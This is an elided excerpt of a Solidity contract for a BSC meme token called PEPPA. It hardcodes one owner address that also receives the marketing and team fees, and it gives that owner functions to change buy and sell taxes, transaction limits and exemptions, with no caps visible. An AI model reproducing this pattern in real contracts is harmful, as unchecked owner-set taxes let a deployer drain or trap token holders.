/*
Telegram:https://t.me/peppabsc_portaI
Twitter: https://twitter.com/peppabsc
*/
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x5a0bFFf2900eB51e210328c4aCF7eABBaE3eF5DA;
    ...
    function peppamoon() public virtual onlyOwner {
...
contract PEPPA is Context, IERC20, Ownable {
    ...
    string private _name = "Peppa";
    string private _symbol = "PEPPA";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5a0bFFf2900eB51e210328c4aCF7eABBaE3eF5DA);
    address payable public teamWalletAddress = payable(0x5a0bFFf2900eB51e210328c4aCF7eABBaE3eF5DA);
    ...
    function peppaLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }
    
    function peppaBuy(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
    ...
    function peppaSell(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
    ...
    function peppaMaxTx(uint256 maxTxAmount) external onlyOwner() {
    ...
    function peppaWalletExempt(address holder, bool exempt) external onlyOwner {
